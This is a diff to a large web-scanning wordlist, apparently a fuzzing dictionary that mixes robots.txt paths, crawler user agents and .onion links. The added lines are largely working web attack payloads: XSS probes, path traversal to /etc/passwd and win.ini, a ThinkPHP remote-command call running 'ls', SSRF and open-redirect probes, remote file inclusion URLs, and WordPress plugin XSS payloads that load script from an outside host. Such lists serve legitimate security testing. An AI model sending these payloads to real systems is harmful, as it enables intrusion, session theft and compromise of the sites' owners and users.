 api/http://hootsuite.com/robots.txt
 api/http://lta.org.uk/robots.txt
@@ -12242,6 +12356,8 @@ api/http://vi.nl/robots.txt
 api/loadmore/*http://revolut.com/robots.txt
 api/og/*http://ontario.ca/robots.txt
 api/og/*http://walgreens.com/robots.txt
+api/qrcode&url=https://www.hezibuluo.com/
+api/youtube/https://www.youtube.com/watch
 app*.jshttp://sketchapp.com/robots.txt
 app*.jshttp://ui.adsabs.harvard.edu/robots.txt
 app-ads.txthttp://hu.wikipedia.org/robots.txt
@@ -13127,6 +13243,7 @@ canard-jitsu/1.0; (http://canard-jitsu.world-servers.com; compatible; windows nt
 cannabisuk: http://fzqnrlcvhkgbdwx5.onion/
 cantonese/search/\?query=.
 caramel\\\'
+carbon/admin/login.jsp?msgid=%27%3balert(%27nuclei%27)%2f%2f
 carn\\
 carn\\1
 carn\\2
@@ -13170,6 +13287,7 @@ catchbot/1.0; http://www.catchbot.com
 catchbot/2.0; +http://www.catchbot.com
 category/good-bites/http://gc.cuny.edu/robots.txt
 category/good-bites/http://redcross.org.uk/robots.txt
+cats/\"920399=1
 cazoodlebot/cazoodlebot-0.1 (cazoodlebot crawler; http://www.cazoodle.com/cazoodlebot; cazoodlebot@cazoodle.com)
 cc\\9
 ccbot/1.0 (+http://www.commoncrawl.org/bot.html)
@@ -13275,6 +13393,7 @@ citistreet.com/1.0+(compatible;mozilla/5.0;msie 7.0;++http://citistreet.com/)
 cityreview robot (+http://www.cityreview.org/crawler/)
 clasificados/http://blippar.com/robots.txt
 clasificados/http://fotmob.com/robots.txt
+class.module.classloader.urls%5b0%5d=http://a.com
 clasys ltd. - http://www.clasys.com
 clear\\5
 cli\\3an
@@ -13594,6 +13713,7 @@ dam/udelimages/student-life/reslife/floorplanshttp://documenter.getpostman.com/r
 dan mcinerney https://github.com/danmcinerney
 dark nexus: http://e266al32vpuorbyg.onion/bookmarks.php
 data-bay: http://jvrnuue4bvbftiby.onion/
+data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;sign_up&quot;,&quot;originating_url&quot;:&quot;https://github.com/coffinxp/payloads/blob/main/env.txt&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f465cd482c3877b7ac865e6f6eaca642f7d7a5d64f60680b5de100f76082d2fc"
 data-protection/our-role-supervisor/complaints/edps-complaint-form*http://fedex.com/robots.txt
 data-protection/our-role-supervisor/complaints/edps-complaint-form*http://mitpress.mit.edu/robots.txt
 datafountains/dmoz downloader (http://ivia.ucr.edu/useragents.shtml)
@@ -13604,6 +13724,7 @@ dataparksearch/4.36 ( http://www.dataparksearch.org/)
 dataparksearch/4.37-23012006 ( http://www.dataparksearch.org/)
 dataparksearch/4.47 (+http://dataparksearch.org/bot)
 dataparksearch/4.xx (http://www.dataparksearch.org/)
+dataservice/disasterrecovery/download/token/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2fetc%2fpasswd
 dataspear/1.0 (spider; http://www.dataspear.com/spider.html; spider@dataspear.com)
 dataspearspiderbot/0.2 (dataspear spider bot; http://dssb.dataspear.com/bot.html; dssb@dataspear.com)
 datenbot( http://www.sicher-durchs-netz.de/bot.html)
@@ -13784,6 +13905,8 @@ e\\60\g
 e\\82
 e\\x
 e\{89b3v|>n\\x9gky+?\{qvkx&9[in'9
+eam/vib?id=c:\\windows\\win.ini
+eam/vibd?id=c:\\windows\\win.ini
 eapollobot/2.0 (compatible; heritrix/2.0.0-snapshot-20071024.170148 +http://www.eapollo-opto.com)
 easy escrow service: http://samsgdtwz6hvjyu4.onion
 easycoin: http://easycoinsayj7p5l.onion/
@@ -14239,6 +14362,7 @@ flapbot/0.7.2 (flaptor crawler; http://www.flaptor.com; crawler at flaptor perio
 flightdeckreportsbot/2.0 (http://www.flightdeckreports.com/pages/bot)
 fluxbb: https://fluxbb.org/
 flyindex.net 1.0/http://www.flyindex.net
+fmlurlsvc/?=&url=https%3a%2f%2fgoogle.com<svg%2fonload%3dalert(document.domain)>
 fmwu\\3
 fnoolebot/2.5.2 (+http://www.fnoole.com/addurl.html)
 followsite bot ( http://www.followsite.com/bot.html )
@@ -14603,6 +14727,7 @@ hpsadm\\7
 hpsadm\\8
 hr/http://browsehappy.com/robots.txt
 hr/http://uib.no/robots.txt
+href="/login?return_to=https%3a%2f%2fgithub.com%2fcoffinxp%2fpayloads%2fblob%2fmain%2fenv.txt"
 ht]gj\\id})(t4*?a1x\\rwmpjxrrh](
 htc http://developer htc.com
 htdig/3.1.6 (http://computerorgs.com)
@@ -15317,6 +15442,7 @@ http://fpl.com/robots.txt
 http://fr.slideshare.net/robots.txt
 http://freepeople.com/robots.txt
 http://freeworld.thc.org/thc-hydra/
+http://frontline-games.com/forum/index.aspx
 http://frontline-games.com/forum/index.php
 http://ftp.ssec.wisc.edu
 http://fubo.tv/robots.txt
@@ -15886,6 +16012,8 @@ https://t.co/iwu1rhzjmw
 https://t.co/lckg4lpzle
 https://t.co/vxwq5seb3m
 https://target.www.metlife.com/*
+https://theirsite.com.mysite.com
+https://theirsite.computer/
 https://udger.com/resources/online-parser?fuas=mozilla%2f5.0+%28iphone%3b+cpu+iphone+os+11_0+like+mac+os+x%29+applewebkit%2f604.1.21+%28khtml%2c+like+gecko%29+version%2f10.0+mobile%2f15a5278f+safari%2f602.1
 https://udger.com/resources/online-parser?fuas=mozilla%2f5.0+%28linux%3b+android+7.1%3b+pixel+build%2fnde63l%29+applewebkit%2f537.36+%28khtml%2c+like+gecko%29+chrome%2f54.0.2840.68+mobile+safari%2f537.36
 https://udger.com/resources/online-parser?fuas=mozilla%2f5.0+%28luneos%2c+like+webos%2f3.0.5%3b+tablet%29+applewebkit%2f537.36+%28khtml%2c+like+gecko%29+qtwebengine%2f5.6.2+chrome%2f45.0.2454.103+safari%2f537.36
@@ -15960,6 +16088,9 @@ https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 https://www.youtube.com/watch?v=e8hnc4v-8ha
 https://www.youtube.com/watch?v=manu1-4u0o8
 https://www.youtube.com/watch?v=uodh4tdwniw
+https://yoursite.com%2523.theirsite.com/
+https://yoursite.com%3f.theirsite.com/
+https://yoursite?c=.theirsite.com/ (use # \ also)
 https://youtu.be/960zbjswzrq
 https://youtu.be/aatz-yj9j6e
 https://youtu.be/bdco6brdaxg
@@ -16100,6 +16231,7 @@ iltrovatore-setaccio/1.2 (it-bot; http://www.iltrovatore.it/bot.html; info@iltro
 iltrovatore-setaccio/1.2-dev (spidering; http://www.iltrovatore.it/aiuto/.....)
 iltrovatore/1.2 (iltrovatore; http://www.iltrovatore.it/bot.html; bot@iltrovatore.it)
 image uploader: http://matrixtxri745dfw.onion/
+image/image%3a%2f%2f%2e%2e%252fetc%252fpasswd
 images/http://blick.ch/robots.txt
 images/http://cpj.org/robots.txt
 images/sites/http://zen.yandex.ru/robots.txt
@@ -16114,6 +16246,7 @@ impartner.htmlhttp://gia.edu/robots.txt
 imperial library of trantor: http://xfmro77i3lixucja.onion/
 in3u0cg\\x7(ej4[ruk\{knq1lbpiq.u
 in\\
+include/thumb.php?dir=http\\..\\..\\config\\config_db.php
 include_path=http://www.evil.com/getdata.php
 incywincy(http://www.look.com)
 incywincy(http://www.loopimprovements.com/robot.html)
@@ -16139,7 +16272,9 @@ index.php/user/logout/http://stubhub.com/robots.txt
 index.php/user/logout/http://theaustralian.com.au/robots.txt
 index.php?chemin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f%2fetc
 index.php?redirect=/\/evil.com
+index.php?redirect=/\/evil.com/
 index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=hellothinkphp
+index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
 indows\\syswow64\\mshtaex\.exe;60
 indows\\temp\\debug\.txt;60
 influencer/mrbeasthttp://match.com/robots.txt
@@ -16234,6 +16369,7 @@ itanimulli: http://yj5rbziqttulgidy.onion/
 ivan grigorov https://hackerone.com/reactors08
 ivia page fetcher (http://ivia.ucr.edu/useragents.shtml)
 ivia/4.0 canonizeurl (http://infomine.ucr.edu/ivia/useragents.shtml
+iwc/idcstateerror.iwc?page=javascript%3aalert(document.domain)%2f%2f
 iytr\{bn<#l[>+'[j;e\\
 j+\{d\\nlc0!dodnpek;|pz^rzi*/s\{~
 j,vth@d*\\x8!uag\{k+\\>9$yfa7\{yp5
@@ -16452,6 +16588,7 @@ lems\\lems
 leonjass\\\\
 lerc\\5
 letscrawl.com/1.0 +http://letscrawl.com/
+letsencrypt/index?filename=c:\\windows\\win.ini
 lf\\
 lg http://developer.lgmobile.com
 lg>6gjc(5|\\bvtjkohsdyosh+o,ln;
@@ -16538,6 +16675,7 @@ lody\\\\
 login/http://boatus.com/robots.txt
 login/http://ikmultimedia.com/robots.txt
 logonserver=\\microsoftaccount
+logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
 loki\\3
 look at http://rd.cs.colorado.edu/harvest/.  such a system is under
 lord\\\'s1000
@@ -19224,6 +19362,7 @@ nd\\
 nebulamozilla/5.0 (compatible; charlotte/1.1; http://www.searchme.com/support/)
 nebullabot/2.2 (http://bot.nebulla.info)
 net-seekr bot/net-seekr bot v1 (http://www.net-seekr.com)
+netbiblio/search/shortview?searchfield=w&searchtype=simple&searchterm=x%5c%27%2balert%281%29%2c%2f%2f
 netinfobot/1.0 (http://netinfo.bg/netinfobot.html)
 netluchs/0.8-dev ( ; http://www.netluchs.de/; ___don't___spam_me_@netluchs.de)
 netnewswire/2.x (mac os x; http://ranchero.com/netnewswire/)
@@ -19748,6 +19887,7 @@ pompos/1.2 http://pompos.iliad.fr
 pompos/1.3 http://dir.com/pompos.html
 pompos/1.x http://dir.com/pompos.html
 pony at noisebridge: http://2ygbaoezjdmacnro.onion/
+portal//..\\\..\\\..\\\..\\\windows\win.ini
 post32.exe|dir%20c:\\
 post32.exe|dir20c\\
 postpost/1.0 (+http://postpo.st/crawlers)
@@ -19902,6 +20042,8 @@ redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser
 redirect=http://www.acbdef.com/index.html
 redirect_uri=http://www.acbdef.com/index.html
+redirector.php?do=nodelay&url=https://interact.sh
+redirector.php?url=https://interact.sh
 redirecturl=http://www.acbdef.com/index.html
 redkernel www-spider 2/0 (+http://www-spider.redkernel-softwares.com/)
 redwood\\1
@@ -20650,6 +20792,7 @@ search/http://sverigesradio.se/robots.txt
 search?*http://wiki.gnome.org/robots.txt
 search?keyword=folha%20de%20fichario$http://pediatrics.aappublications.org/robots.txt
 search?query=http://museodelprado.es/robots.txt
+searchblox/servlet/fileservlet?col=1&url=c:\\windows\\win.ini
 searchbyusa/2 (searchbyusa; http://www.searchbyusa.com/bot.html; info@searchbyusa.com)
 searchhttp://american.edu/robots.txt
 searchhttp://articles.latimes.com/robots.txt
@@ -20669,6 +20812,7 @@ searchsight/2.0 (http://searchsight.com/)
 searchspider/1.2 (searchspider; http://www.searchspider.com; webmaster@searchspider.com)
 secssobrowser (compatible; googlebot/2.1; +https://sts.secsso.net)
 sectionhttp://postman.com/robots.txt
+securityrealm/user/admin/descriptorbyname/org.jenkinsci.plugins.github.config.githubtokencredentialscreator/createtokenbypassword?apiurl=http://example.com
 sed\\60a
 see <http://www.ics.uci.edu:80/websoft/libwww-perl/>
 see https://www.torproject.org/about/torusers.html.en for more info.
@@ -20693,6 +20837,7 @@ services/conferences/news/*?*http://kcl.ac.uk/robots.txt
 services/conferences/news/*?*http://nbcuniversal.com/robots.txt
 services/conferences/news/*?*http://pennlive.com/robots.txt
 services/http://alabama.travel/robots.txt
+servlet/fileservlet?col=1&url=c:\\windows\\win.ini
 set system name <iframe src=http://www.vulnerability-lab.com>
 set/http://broadcom.com/robots.txt
 set/http://empatica.com/robots.txt
@@ -22308,6 +22453,7 @@ sharepass: http://tklxxs3rdzdjppnl.onion/sharepass/
 sharewareplazafilecheckbot/1.0+(+http://www.sharewareplaza.com)
 sheep76\\
 shim-crawler(mozilla-compatible; http://www.logos.ic.i.u-tokyo.ac.jp/crawler/; crawl@logos.ic.i.u-tokyo.ac.jp)
+shindig/gadgets/proxy?container=default&url=http://oast.pro
 shine\\0
 shine\\1
 shine\\3
@@ -22554,6 +22700,7 @@ staff/http://data.consilium.europa.eu/robots.txt
 staging.donate.torproject.org: http://cvtwbn7mgxki7gvc.onion/
 standards-and-positions/principles-and-standards/e-examples/http://weblio.jp/robots.txt
 stat/rss/http://energystar.gov/robots.txt
+static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shells
 stats/player-stats/*http://coolors.co/robots.txt
 stats/player-stats/*http://hotels.com/robots.txt
 steeler/1.x (http://www.tkl.iis.u-tokyo.ac.jp/~crawler/)
@@ -22790,6 +22937,7 @@ tl-c^y1~gh\\_6(,ft+}!o<~x4#=h@=
 tmp-http://lesoir.be/robots.txt
 tnds\\9
 tnhm|)\\}]=enalw,9<%
+to see all available qualifiers, see our <a class="link--intextblock" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax">documentation</a>.
 toe\\2
 tools/ai-design-ua$http://anghami.com/robots.txt
 top121498\\][
@@ -22868,6 +23016,7 @@ ue>u|&-f2w(iy$+degem&c\\s!0%za`
 ufz%xnr2*y`o2{9]rb4bu<%"1vq\\dj
 uglab\\6
 uhp6>[.]nf>%z<tl%+gxd\\r=,lf9ye
+ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file://c:\\windows\\win.ini
 uiloggerajaxhttp://docker.com/robots.txt
 uiloggerajaxhttp://theregister.co.uk/robots.txt
 ujga\\
@@ -22937,6 +23086,39 @@ uz/http://caniuse.com/robots.txt
 uz/http://ucl.ac.uk/robots.txt
 u|i9v_q6c95ur]ztz'/,8/fu\\qht!j
 v-~#@v20,~c\\&wk2=oqr;@\{yes\\z\\x
+v1/asset/https://apigateway.mmgfusion.com/dni
+v1/asset/https://bat.bing.com/bat.js
+v1/asset/https://eum.instana.io/eum.min.js
+v1/asset/https://fonts.googleapis.com/css
+v1/asset/https://fonts.googleapis.com/css2
+v1/asset/https://fonts.googleapis.com/icon
+v1/asset/https://static.ads-twitter.com/uwt.js
+v1/asset/https://suzukikuwait.com/favicon.ico
+v1/asset/https://track.dictum.com/t.js
+v1/asset/https://www.bmw-lao.la/favicon.ico
+v1/asset/https://www.bmw-m.com/favicon.ico
+v1/asset/https://www.bmw.ch/favicon.ico
+v1/asset/https://www.bmw.ci/favicon.ico
+v1/asset/https://www.bmw.com.br/favicon.ico
+v1/asset/https://www.bmw.com.ph/favicon.ico
+v1/asset/https://www.bmw.com.tr/favicon.ico
+v1/asset/https://www.bmw.com.tw/favicon.ico
+v1/asset/https://www.bmw.com/p15r.js
+v1/asset/https://www.bmw.fr/favicon.ico
+v1/asset/https://www.bmw.is/favicon.ico
+v1/asset/https://www.bmw.it/favicon.ico
+v1/asset/https://www.bmw.nc/favicon.ico
+v1/asset/https://www.carhartt-wip.com/favicon.ico
+v1/asset/https://www.galeria.de/suche
+v1/asset/https://www.google-analytics.com/analytics.js
+v1/asset/https://www.googletagmanager.com/gtm.js
+v1/asset/https://www.tk-immo.de/manifest.json
+v1/asset/https://zaitaku-job.jp/favicon.ico
+v1/urn/https://urn.kb.se/resolve
+v2/___https://wisepops.net/loader.js
+v2/___https://www.googletagmanager.com/gtag/js
+v2/___https://www.googletagmanager.com/gtm.js
+v2/___https://www.rapidscansecure.com/siteseal/siteseal.js
 v[x!y42ma\\5e|vx#)rd
 v\\000
 v\\000a
@@ -23228,6 +23410,24 @@ wp-admin/admin-ajax.phphttp://tastingtable.com/robots.txt
 wp-admin/admin-ajax.phphttp://toastmasters.org/robots.txt
 wp-admin/admin-ajax.phphttp://trustedreviews.com/robots.txt
 wp-admin/admin-ajax.phphttp://uneex.org/robots.txt
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v15%5c'%3e%3c/script%3e
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v6%5c'%3e%3c/script%3e
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v15%5c'%3e%3c/script%3e
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v6%5c'%3e%3c/script%3e
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&uid=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&token=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&email=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&uid=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&token=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&email=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v15%5c'%3e%3c/script%3e
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3e%3cscript%20type=text/javascript%20src=%5c'https://slow.destinyfernandi.com/hos?&v6%5c'%3e%3c/script%3e
 wp-admin/admin-post.php?testingfsoc=1&url=https://pastebin.com/raw/i1gllhhj&filename=wpdemos
 wp-admin/http://amplitude.com/robots.txt
 wp-admin/http://crossway.org/robots.txt
@@ -23238,6 +23438,13 @@ wp-content/mu-plugins/http://hdr.undp.org/robots.txt
 wp-content/mu-plugins/http://oyc.yale.edu/robots.txt
 wp-content/mu-plugins/http://patchstack.com/robots.txt
 wp-content/mu-plugins/http://seoul.co.kr/robots.txt
+wp-content/plugins/dm-albums/template/album.php?security_file=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/myflash/myflash-button.php?wppath=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?mypath=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/site-import/admin/page.php?url=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/wordtube/wordtube-button.php?wppath=http://rfi.nessus.org/rfi.txt
+wp-content/plugins/wp-table/js/wptable-button.php?wppath=http://rfi.nessus.org/rfi.txt
 wp-content/themes/\
 wp-content/uploads/*http://fiberaltyapisorgulama.com/robots.txt
 wp-content/uploads/http://bgs.ac.uk/robots.txt
@@ -23272,6 +23479,7 @@ wp-content/uploads/wp-import-export-lite/http://weather.gc.ca/robots.txt
 wp-content/uploads/wp-import-export-lite/http://zola.com/robots.txt
 wp-content/uploads/wpo/wpo-plugins-tables-list.jsonhttp://grahamcluley.com/robots.txt
 wp-includes/js/jquery/\
+wp-login.php?redirect_to=http%3a%2f%2f%3f1%3c%2fscript%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e
 wp-register.phphttp://draft.blogger.com/robots.txt
 wp-register.phphttp://leonardo.ai/robots.txt
 wphttps://www.etracker.com/app/uploads/wpforms
@@ -23367,6 +23575,8 @@ xmlns:user="http://mycompany.com/mynamespace">
 xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;
 xmlns:xap="http://ns.adobe.com/xap/1.0/">
 xmlns:xapmm="http://ns.adobe.com/xap/1.0/mm/">
+xmlpeek.aspx?dt=\\..\\..\\..\\..\\..\\..\\windows\\win.ini&x=/validate.ashx?requri
+xmlpeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini&x=/validate.ashx?requri
 xp0l=ug=n%t,?w)&,\\x\{pw^v4fqgon
 xrl/2.00b1 (linux; i686; en-us) (+http://metamark.net/about)
 xsl/http://protonmail.com/robots.txt
